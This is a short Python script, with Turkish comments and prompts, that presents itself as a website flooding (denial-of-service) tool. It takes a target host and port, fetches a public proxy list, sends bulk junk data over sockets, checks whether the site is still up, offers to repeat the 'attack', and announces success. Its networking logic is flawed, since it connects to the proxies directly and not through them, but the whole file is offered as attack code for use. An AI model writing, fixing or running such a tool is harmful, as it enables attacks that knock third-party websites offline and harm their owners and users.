import socket
import time
import requests

def send_packets(host, port, packet_count, proxy_list):
    for proxy in proxy_list:
        # Socket oluştur
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Proxy kullanmak için bağlantı yap
        s.settimeout(10)
        s.connect((proxy, port))
        
        # Paketleri gönder
        start_time = time.time()
        data = b'PAKET'* packet_count
        s.sendall(data)
        end_time = time.time()
        sending_time = end_time - start_time
        
        # Bağlantıyı kapat
        s.close()
        print("Gönderme hızı: ", packet_count/sending_time, " paket/s")
    try:
        response = requests.get(host)
        if response.status_code == 200:
            print("Site hala aktif")
            repeat_attack = input("Tekrar saldırı yapılsın mı? (yes/no)")
            if repeat_attack.lower() == 'yes':
                send_packets(host, port, packet_count, proxy_list)
            else:
                print("Saldırı iptal edildi")
        else:
            print("Site kapandı")
    except:
        print("Siteye ulaşılamadı")

host = input("Hedef website adresi: ")
port = int(input("Hedef port numarası: "))
packet_count = int(input("Gönderilecek paket sayısı: "))

# Proxy listesini al
proxy_list = []
try:
    response = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http")
    proxy_list = response.text.split('\r\n')
except:
    print("Proxy listesi alınamadı")

send_packets(host, port, packet_count, proxy_list)
print("Saldırı başarılı")
